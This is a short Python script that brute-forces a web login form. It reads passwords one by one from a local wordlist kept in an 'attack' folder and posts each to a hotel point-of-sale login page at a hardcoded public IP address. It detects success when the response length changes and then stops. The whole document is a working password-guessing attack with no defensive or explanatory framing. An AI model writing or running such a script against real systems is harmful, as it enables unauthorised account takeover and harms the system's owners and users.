# importing the requests library
import requests
import json
import csv


def fetch(password):
    PARAMS['upassword'] = password
    r = requests.post(url=URL, data=PARAMS)
    # data = r.json()
    length = len(r.content)
    print(length)
    if length != 4264:
        return True


# api-endpoint
user = 'admin'
# password = 'admin'
URL = f'http://112.135.80.107/hotel_pos/'
userParams = {"acID": "abc", "acPW": "12345"}

# defining a params dict for the parameters to be sent to the API
PARAMS = {'uname': 'user',
          'upassword': '',
          'login': 'Login'}


with open("C:/Users/HP/Desktop/Desktop/programming/WEB/scratch/attack/p100.txt", newline='') as passwords:
    password_reader = csv.reader(passwords)
    for [password] in password_reader:
        print(password)
        if fetch(password):
            break


